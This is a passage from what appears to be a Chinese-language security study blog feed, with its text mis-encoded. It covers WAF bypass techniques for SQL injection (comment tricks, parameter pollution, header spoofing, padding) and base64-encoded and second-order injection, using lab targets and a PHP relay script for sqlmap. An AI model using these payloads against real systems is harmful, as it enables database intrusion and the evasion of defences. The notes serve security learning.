class="line">s-&gt;%73-&gt;%25%37%33</span><br><span class="line"></span><br><span class="line">hex,unlcode,base64ç­‰</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ›´æ”¹è¯·æ±‚æäº¤æ–¹å¼"><a href="#æ›´æ”¹è¯·æ±‚æäº¤æ–¹å¼" class="headerlink" title="æ›´æ”¹è¯·æ±‚æäº¤æ–¹å¼"></a>æ›´æ”¹è¯·æ±‚æäº¤æ–¹å¼</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET POST COOKIEç­‰</span><br><span class="line"></span><br><span class="line">POST-&gt;multipart/form-data</span><br></pre></td></tr></table></figure><h4 id="WAFç»•è¿‡-æ•°æ®åº“ç‰¹æ€§"><a href="#WAFç»•è¿‡-æ•°æ®åº“ç‰¹æ€§" class="headerlink" title="WAFç»•è¿‡-æ•°æ®åº“ç‰¹æ€§"></a>WAFç»•è¿‡-æ•°æ®åº“ç‰¹æ€§</h4><p><strong>MysqlæŠ€å·§</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107696.png" alt="img"></p><p>ï¼ˆ1ï¼‰mysqlæ³¨é‡Šç¬¦æœ‰ä¸‰ç§ï¼š#ã€/<em>â€¦</em>/ã€â€“â€¦(æ³¨æ„â€“åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæˆ–è€…ä¸ºâ€“+)</p><p>ï¼ˆ2ï¼‰ç©ºæ ¼ç¬¦:[0x09,0x0a-0x0d,0x20,0xa0]</p><p>ï¼ˆ3ï¼‰ç‰¹æ®Šç¬¦å·ï¼š%aæ¢è¡Œç¬¦</p><p>å¯ç»“åˆæ³¨é‡Šç¬¦ä½¿ç”¨%23%0aï¼Œ%2d%2d%0aã€‚</p><p>ï¼ˆ4ï¼‰å†…è”æ³¨é‡Šï¼š</p><p>/<em>!UnIon12345SelEcT</em>/1,user()//æ•°å­—èŒƒå›´1000-50540</p><p>ï¼ˆ5ï¼‰mysqlé»‘é­”æ³•</p><p>select{xusername}from{x11test.admin};</p><p><strong>SQLServeræŠ€å·§</strong></p><p>ï¼ˆ1ï¼‰ç”¨æ¥æ³¨é‡Šæ‰æ³¨å…¥åæŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*                                   Cè¯­è¨€é£æ ¼æ³¨é‡Š</span><br></pre></td></tr></table></figure><p>SQLæ³¨é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;00ï¼…ç©ºå­—èŠ‚</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ç©ºç™½ç¬¦ï¼š[0x01-0x20]</p><p>ï¼ˆ3ï¼‰ç‰¹æ®Šç¬¦å·ï¼š%3aå†’å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1union:select1,2from:admin</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å‡½æ•°å˜å½¢ï¼šå¦‚db_name ç©ºç™½å­—ç¬¦</p><p>3ã€OracleæŠ€å·§</p><ul><li><p>æ³¨é‡Šç¬¦ï¼šâ€“ã€/**/</p></li><li><p>ç©ºç™½å­—ç¬¦ï¼š[0x00,0x09ï¼Œ0x0a-0x0d,0x20]</p></li></ul><p>4.é…åˆFUZZï¼ˆ<a href="https://blog.csdn.net/weixin_44364851/article/details/111401383?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control">SQLI FUZZå­—å…¸</a>ï¼Œ<a href="https://mochu.blog.csdn.net/article/details/109526779?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control">SQLæ³¨å…¥è¿‡æ»¤å…³é”®å­—çš„Fuzzå­—å…¸</a>ï¼‰</p><p>å°±æ˜¯æ¨¡ç³Šæµ‹è¯•ï¼Œæ‰¹é‡æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1ã€ä½ç½®ä¸€ã€‘unionã€ä½ç½®äºŒã€‘selectã€ä½ç½®ä¸‰ã€‘1,2,db_name()ã€ä½ç½®å››ã€‘fromã€ä½ç½®äº”ã€‘admin</span><br></pre></td></tr></table></figure><h4 id="WAFç»•è¿‡-é€»è¾‘å±‚"><a href="#WAFç»•è¿‡-é€»è¾‘å±‚" class="headerlink" title="WAFç»•è¿‡-é€»è¾‘å±‚"></a>WAFç»•è¿‡-é€»è¾‘å±‚</h4><p><strong>é€»è¾‘é—®é¢˜</strong></p><ol><li>äº‘wafé˜²æŠ¤ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šå°è¯•é€šè¿‡æŸ¥æ‰¾ç«™ç‚¹çš„çœŸå®IPï¼Œä»è€Œç»•è¿‡CDNé˜²æŠ¤ã€‚</li><li>å½“æäº¤GETã€POSTåŒæ—¶è¯·æ±‚æ—¶ï¼Œè¿›å…¥POSTé€»è¾‘ï¼Œè€Œå¿½ç•¥äº†GETè¯·æ±‚çš„æœ‰å®³å‚æ•°è¾“å…¥,å¯å°è¯•Bypassã€‚</li><li>HTTPå’ŒHTTPSåŒæ—¶å¼€æ”¾æœåŠ¡ï¼Œæ²¡æœ‰åšHTTPåˆ°HTTPSçš„å¼ºåˆ¶è·³è½¬ï¼Œå¯¼è‡´HTTPSæœ‰WAFé˜²æŠ¤ï¼ŒHTTPæ²¡æœ‰é˜²æŠ¤ï¼Œç›´æ¥è®¿é—®HTTPç«™ç‚¹ç»•è¿‡é˜²æŠ¤ã€‚</li></ol><p>ï¼ˆ4ï¼‰ç‰¹æ®Šç¬¦å·%00ï¼Œéƒ¨åˆ†wafé‡åˆ°%00æˆªæ–­ï¼Œåªèƒ½è·å–åˆ°å‰é¢çš„å‚æ•°ï¼Œæ— æ³•è·å–åˆ°åé¢çš„æœ‰å®³å‚æ•°è¾“å…¥ï¼Œä»è€Œå¯¼è‡´Bypassã€‚æ¯”å¦‚ï¼šid=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns</p><p><strong>æ€§èƒ½é—®é¢˜</strong></p><p>çŒœæƒ³1ï¼šåœ¨è®¾è®¡WAFç³»ç»Ÿæ—¶ï¼Œè€ƒè™‘è‡ªèº«æ€§èƒ½é—®é¢˜ï¼Œå½“æ•°æ®é‡è¾¾åˆ°ä¸€å®šå±‚çº§ï¼Œä¸æ£€æµ‹è¿™éƒ¨åˆ†æ•°æ®ã€‚åªè¦ä¸æ–­çš„å¡«å……æ•°æ®ï¼Œå½“æ•°æ®è¾¾åˆ°ä¸€å®šæ•°ç›®ä¹‹åï¼Œæ¶æ„ä»£ç å°±ä¸ä¼šè¢«æ£€æµ‹äº†ã€‚</p><p>çŒœæƒ³2ï¼šä¸å°‘WAFæ˜¯Cè¯­è¨€å†™çš„ï¼Œè€ŒCè¯­è¨€è‡ªèº«æ²¡æœ‰ç¼“å†²åŒºä¿æŠ¤æœºåˆ¶ï¼Œå› æ­¤å¦‚æœWAFåœ¨å¤„ç†æµ‹è¯•å‘é‡æ—¶è¶…å‡ºäº†å…¶ç¼“å†²åŒºé•¿åº¦å°±ä¼šå¼•å‘bugï¼Œä»è€Œå®ç°ç»•è¿‡ã€‚</p><p>ä¾‹å­1ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</span><br><span class="line"></span><br><span class="line">PSï¼š0xA*1000æŒ‡0xAåé¢â€A&quot;é‡å¤1000æ¬¡ï¼Œä¸€èˆ¬æ¥è¯´å¯¹åº”ç”¨è½¯ä»¶æ„æˆç¼“å†²åŒºæº¢å‡ºéƒ½éœ€è¦è¾ƒå¤§çš„æµ‹è¯•é•¿åº¦ï¼Œè¿™é‡Œ1000åªåšå‚è€ƒä¹Ÿè®¸åœ¨æœ‰äº›æƒ…å†µä¸‹å¯èƒ½ä¸éœ€è¦è¿™ä¹ˆé•¿ä¹Ÿèƒ½æº¢å‡ºã€‚</span><br></pre></td></tr></table></figure><p>ä¾‹å­2ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1</span><br><span class="line"></span><br><span class="line">union</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line"></span><br><span class="line">1,schema_name,3</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA.schemata</span><br><span class="line"></span><br><span class="line">å¤‡æ³¨ï¼šè·å–è¯·æ±‚å‚æ•°ï¼Œåªè·å–å‰100ä¸ªå‚æ•°ï¼Œç¬¬101ä¸ªå‚æ•°å¹¶æ²¡æœ‰è·å–åˆ°ï¼Œå¯¼è‡´SQLæ³¨å…¥ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç™½åå•</strong></p><p>æ–¹å¼ä¸€ï¼šIPç™½åå•</p><p>ä»ç½‘ç»œå±‚è·å–çš„ipï¼Œè¿™ç§ä¸€èˆ¬ä¼ªé€ ä¸æ¥ï¼Œå¦‚æœæ˜¯è·å–å®¢æˆ·ç«¯çš„IPï¼Œè¿™æ ·å°±å¯èƒ½å­˜åœ¨ä¼ªé€ IPç»•è¿‡çš„æƒ…å†µã€‚</p><p>æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹httpçš„headeræ¥bypasswaf</span><br><span class="line"></span><br><span class="line">X-forwarded-for</span><br><span class="line">X-remote-IP</span><br><span class="line">X-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼šé™æ€èµ„æº</p><p>ç‰¹å®šçš„é™æ€èµ„æºåç¼€è¯·æ±‚ï¼Œå¸¸è§çš„é™æ€æ–‡ä»¶(.js.jpg.swf.cssç­‰ç­‰)ï¼Œç±»ä¼¼ç™½åå•æœºåˆ¶ï¼Œwafä¸ºäº†æ£€æµ‹æ•ˆç‡ï¼Œä¸å»æ£€æµ‹è¿™æ ·ä¸€äº›é™æ€æ–‡ä»¶ååç¼€çš„è¯·æ±‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php?id=1</span><br><span class="line"></span><br><span class="line">http://10.9.9.201/sql.php/1.js?id=1</span><br></pre></td></tr></table></figure><p>å¤‡æ³¨ï¼šAspx/phpåªè¯†åˆ«åˆ°å‰é¢çš„.aspx/.phpåé¢åŸºæœ¬ä¸è¯†åˆ«</p><p>æ–¹å¼ä¸‰ï¼šurlç™½åå•</p><p>ä¸ºäº†é˜²æ­¢è¯¯æ‹¦ï¼Œéƒ¨åˆ†wafå†…ç½®é»˜è®¤çš„ç™½åå•åˆ—è¡¨ï¼Œå¦‚admin/manager/systemç­‰ç®¡ç†åå°ã€‚åªè¦urlä¸­å­˜åœ¨ç™½åå•çš„å­—ç¬¦ä¸²ï¼Œå°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ã€‚å¸¸è§çš„urlæ„é€ å§¿åŠ¿</p><h3 id="WAFåŠç»•è¿‡æ€è·¯"><a href="#WAFåŠç»•è¿‡æ€è·¯" class="headerlink" title="WAFåŠç»•è¿‡æ€è·¯"></a>WAFåŠç»•è¿‡æ€è·¯</h3><h4 id="å®‰å…¨ç‹—å®‰è£…"><a href="#å®‰å…¨ç‹—å®‰è£…" class="headerlink" title="å®‰å…¨ç‹—å®‰è£…"></a>å®‰å…¨ç‹—å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulner.me/docs/install-safedog/</span><br></pre></td></tr></table></figure><h4 id="SQLç»•è¿‡"><a href="#SQLç»•è¿‡" class="headerlink" title="SQLç»•è¿‡"></a>SQLç»•è¿‡</h4><p><strong>åŸºç¡€çŸ¥è¯†</strong></p><p>éƒ¨åˆ†bypass sqlinject payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23 </span><br><span class="line">id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23 </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23 </span><br><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23 </span><br><span class="line">/*!44509select*/å½“æ•°æ®åº“ç‰ˆæœ¬æ˜¯4.45.09ä»¥ä¸Šç‰ˆæœ¬å°±ä¼šæ‰§è¡Œ/*! ....  */ ä¸­çš„è¯­å¥ï¼Œå¦åˆ™ä¸ä¼šæ‰§è¡Œï¼Œè€Œå¦‚æœæ²¡æœ‰44509`/*!select*/`å°±åªèƒ½æ˜¯æ³¨é‡Šã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/ </span><br><span class="line"></span><br><span class="line">%20æ˜¯ç©ºæ ¼ï¼Œ%23æ˜¯#è¿™æ¡è¯­å¥å°±æ˜¯:id=1/**&amp;id=-1 union select 1,2,3#*/ </span><br><span class="line">/***/ä»£è¡¨æ³¨é‡Šçš„æ„æ€,è€Œåœ¨apacheä¸­å¦‚æœä¸€ä¸ªå˜é‡æ¥æ”¶2ä¸ªå‚æ•°,æœ€åçš„é‚£ä¸ªå‚æ•°å°±æ˜¯æœ€åçš„ç»“æœï¼Œå°±ç›¸å½“äºid=1/**å’Œid=-1%20union%20select%201,2,3%23*/ æ¥æ”¶äº†åè€…Mè¿™é‡Œåˆ©ç”¨äº†å‚æ•°æ±¡æŸ“ã€‚</span><br><span class="line"></span><br><span class="line">ç­‰ä»·sqlè¯­å¥:</span><br><span class="line">select * from users where id=-1 union select 1,2,3#*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=-1 %20union%20all%23%0a%20select%201,2,3%23 </span><br><span class="line">id=-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23 </span><br><span class="line"></span><br><span class="line">/**/æ³¨é‡Šç¬¦ä¸å½±å“</span><br><span class="line">%230%0A ==#0æ¢è¡Œ</span><br><span class="line">ç›¸å½“äº:</span><br><span class="line">id=-1  union all#</span><br><span class="line"> select 1,#0</span><br><span class="line"> database/**/(),3# </span><br><span class="line"> æœ€åæ‰§è¡Œç»“æœå°±æ˜¯id=-1 union all select 1,database/**/(),3# </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107297.png" alt="image-20210831214832115"></p><p>åŠ ä¸åŠ alléƒ½ä¸€æ ·</p><h4 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h4><p><strong>æäº¤æ–¹å¼ç»•è¿‡WAF</strong></p><p>å¦‚æœæˆ‘ä»¬çš„å‚æ•°æ˜¯é€šè¿‡REQUESTè¿›è¡Œæ¥æ”¶çš„ï¼Œè€ŒWAFé€šè¿‡æ£€æµ‹GETçš„æ–¹å¼è¿›è¡Œé˜²æŠ¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡POSTçš„æ–¹å¼æäº¤æ•°æ®ï¼Œä»è€Œç»•è¿‡WAF</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107512.png" alt="image-20210831202740911"></p><p>æˆ‘ä»¬æµ‹è¯•å‘ç°æˆåŠŸç»•è¿‡</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107413.png" alt="image-20210831202834958" style="zoom:50%;" /><p><strong>é€šè¿‡æ³¨é‡Šç¬¦ç»•è¿‡</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/å’Œ/***/éƒ½æ˜¯æ³¨é‡Šç¬¦ï¼Œéƒ½å¯ä»¥ç”¨æ¥æ³¨é‡Šã€‚ä»–ä»¬çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107725.png" alt="image-20210831211201461"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107542.png" alt="image-20210831204008554"></p><p>é€šè¿‡åŠ å…¥æ³¨é‡Šç¬¦ï¼Œä¸å½±å“sqlè¯­å¥ï¼Œè¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚</p><p>  <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107327.png" alt="image-20210831204204715"></p><p><strong>httpå‚æ•°æ±¡æŸ“</strong></p><p>åœ¨ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å¾€å¾€ä¼šåœ¨GET/POSTè¯·æ±‚ä¸­å¸¦ä¸Šå‚æ•°ã€‚é€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒåå‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨HTTPåè®®ä¸­æ˜¯å…è®¸åŒåå‚æ•°å¤šæ¬¡å‡ºç°çš„ã€‚</p><p> ä»¥ä¸Šå›¾æœåŠ¡å™¨ä¸ºä¾‹å‡è®¾è¯·æ±‚ä¸ºindex.php?id=1&amp;id=2ï¼Œå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆé€šè¿‡tomcatè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥tomcatå»è¯·æ±‚apacheæœåŠ¡å™¨ï¼Œè€Œapacheè§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚å®é™…æä¾›æœåŠ¡çš„æ˜¯apacheæœåŠ¡å™¨ï¼Œå› æ­¤è¿”å›å®¢æˆ·ç«¯çš„æ˜¯id=2ã€‚</p><table><thead><tr><th>WebæœåŠ¡å™¨</th><th>å‚æ•°è·å–å‡½æ•°</th><th>è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(â€œparâ€)</td><td>Last</td></tr><tr><td>JSP/Tomcat</td><td>Request.getParameter(â€œparâ€)</td><td>First</td></tr><tr><td>Perl(CGI)/Apache</td><td>Param(â€œparâ€)</td><td>First</td></tr><tr><td>Python/Apache</td><td>Getvalue(â€œparâ€)</td><td>All(List)</td></tr><tr><td>ASP/IIS</td><td>Request.QueryString(â€œparâ€)</td><td>All(comma-delimited string)</td></tr></tbody></table><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107944.png" alt="image-20210831210602805"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108991.png" alt="image-20210831210553919" style="zoom:50%;" /><p>å¯ä»¥çœ‹åˆ°apacheæœ€åæ¥æ”¶åˆ°äº†3ã€‚</p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/backlion/p/9721687.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/nzjdsds/article/details/93740686</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17WEBæ¼æ´--SQLæ³¨å…¥ä¹‹äºŒæ¬¡ã€åŠ è§£å¯†ã€DNSç­‰æ³¨å…¥</title>
      <link href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="åŠ è§£å¯†"><a href="#åŠ è§£å¯†" class="headerlink" title="åŠ è§£å¯†"></a>åŠ è§£å¯†</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å°†å‚æ•°é€šè¿‡base64æˆ–è€…å…¶ä»–æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿›è¡Œä¼ è¾“ï¼Œåœ¨é€šè¿‡åç«¯è¿›è¡Œè§£å¯†ã€‚</p><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-21/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D;</span><br></pre></td></tr></table></figure><p>cookieå­˜åœ¨åŠ å¯†<code>YWRtaW4%3D</code>ï¼Œbase64è½¬æ¢ä¸ºadminï¼Œæ‰€æœ‰æˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬çš„æ³¨å…¥é€šè¿‡base64åŠ å¯†ä¼ è¾“è¿‡å»å°±okäº†ã€‚</p><p>ç¬¬ä¸€ä¸ªè¿”å›æ­£ç¡®ï¼Œç¬¬äºŒä¸ªè¿”å›é”™è¯¯å­˜åœ¨æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and 1=1 #</span><br><span class="line">ç¼–ç å:</span><br><span class="line">YWRtaW4nKSBhbmQgMT0xICM=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and 1=2 #</span><br><span class="line">ç¼–ç å:</span><br><span class="line">YWRtaW4nKSBhbmQgMT0yICM=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯•ä¸‹æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and extractvalue(1,concat(0x7e,database(),0x7e)) #</span><br><span class="line">JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpICM=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106887.png" alt="image-20210829190951933"></p><p>é€šè¿‡sqlmapä¸­è½¬æ³¨å…¥ï¼Œå°†payloadç¼–ç ä¸ºbase64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=&#x27;http://xxxx/job_bystjb/yjs_byszjs.asp?id=&#x27;;</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);</span><br><span class="line">echo $payload;</span><br><span class="line">$urls=$url.$payload;</span><br><span class="line">file_get_contents($urls);</span><br><span class="line">echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h3><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106892.png" alt="image-20210829191514117"></p><p>â€‹        äºŒæ¬¡æ³¨å…¥æ˜¯å­˜å‚¨å‹æ³¨å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºæ„é€ æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°äº†SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚è¯¦ç»†ç‚¹æ¥è®²ï¼Œå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† addslashes æˆ–è€…æ˜¯å€ŸåŠ© get_magic_quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ 